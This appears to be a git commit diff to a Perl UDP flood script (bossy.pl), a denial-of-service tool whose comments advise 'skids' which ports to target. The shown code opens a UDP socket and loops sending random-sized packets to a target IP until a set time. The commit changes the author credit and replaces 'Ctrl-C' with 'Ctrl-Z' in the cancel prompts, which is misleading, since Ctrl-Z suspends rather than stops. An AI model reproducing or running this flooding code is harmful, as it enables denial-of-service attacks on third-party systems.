1ac8f8866263113fec128b3ac297ba5c5940a48e
bossy0 <36817786+bossy0@users.noreply.github.com>
2018-05-24 00:42:39 +0300

    Update bossy.pl

--- bossy.pl
+++ bossy.pl
@@ -1,6 +1,6 @@
 #!/usr/bin/perl
 
-#Created by ~TwentyOne
+#Created by ~ BOSSY
 #Reccomendations (For skids): 
 #IP -   Don't DDoS Government Websites.
 #Port - Use '80' for HTTP (Most Common) or '53' for DNS or '443' for https.
@@ -32,10 +32,10 @@ my ($iaddr,$endtime,$psize,$pport);
 $iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
 $endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
-print "~To cancel the attack press \'Ctrl-C\'\n\n";
+print "To cancel the attack press \'Ctrl-Z\'\n\n";
 print "|IP|\t\t |Port|\t\t |Size|\t\t |Time|\n";
 print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
-print "To cancel the attack press 'Ctrl-C'\n" unless $time;
+print "To cancel the attack press 'Ctrl-Z'\n" unless $time;
 for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1500-64)+64) ;
   $pport = $port ? $port : int(rand(65500))+1;
